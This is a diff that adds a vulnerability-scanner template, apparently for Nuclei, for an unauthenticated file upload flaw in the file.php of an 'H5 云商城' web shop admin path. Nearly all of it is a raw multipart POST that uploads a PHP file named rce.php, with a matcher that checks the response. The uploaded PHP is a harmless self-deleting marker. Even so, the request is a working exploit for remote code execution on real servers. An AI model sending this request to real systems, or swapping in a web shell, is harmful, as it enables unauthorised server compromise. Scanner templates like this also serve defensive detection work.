@@ -1,0 +1,29 @@
+id: yun-h5-upload
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: H5 云商城 file.php 文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /admin/commodtiy/file.php?upload=1 HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+        Content-Length: 244
+
+        ------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+        Content-Disposition: form-data; name="file"; filename="rce.php"
+        Content-Type: application/octet-stream
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+        ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - .php
